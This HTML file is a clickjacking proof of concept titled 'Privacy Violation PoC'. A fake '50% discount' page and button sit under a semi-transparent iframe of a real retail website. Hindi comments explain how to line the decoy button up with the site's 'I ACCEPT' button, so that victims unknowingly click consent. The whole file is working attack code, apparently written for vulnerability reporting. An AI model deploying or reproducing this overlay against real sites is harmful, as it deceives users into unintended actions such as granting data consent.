<!DOCTYPE html>
<html>
<head>
    <title>Privacy Violation PoC</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; }
        
        #decoy-layer {
            position: absolute;
            width: 100%;
            height: 100%;
            background: #fff;
            z-index: 1;
            display: flex;
            justify-content: center;
        }

        #fake-btn {
            position: absolute;
            /* Mobile screen के हिसाब से 'I ACCEPT' बटन की जगह सेट करें */
            bottom: 20px; 
            width: 80%;
            padding: 15px;
            background: #27ae60;
            color: white;
            border: none;
            font-weight: bold;
            border-radius: 5px;
            cursor: pointer;
        }

        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 2;
            opacity: 0.5; /* Alignment चेक करने के लिए 0.5 रखें */
            border: none;
        }
    </style>
</head>
<body>

    <div id="decoy-layer">
        <h2 style="margin-top: 50px;">GET 50% DISCOUNT!</h2>
        <p>Click the button below to get your coupon code.</p>
        <button id="fake-btn">GET DISCOUNT CODE</button>
    </div>

    <iframe src="https://www.underarmour.com/en-us/"></iframe>

</body>
</html>
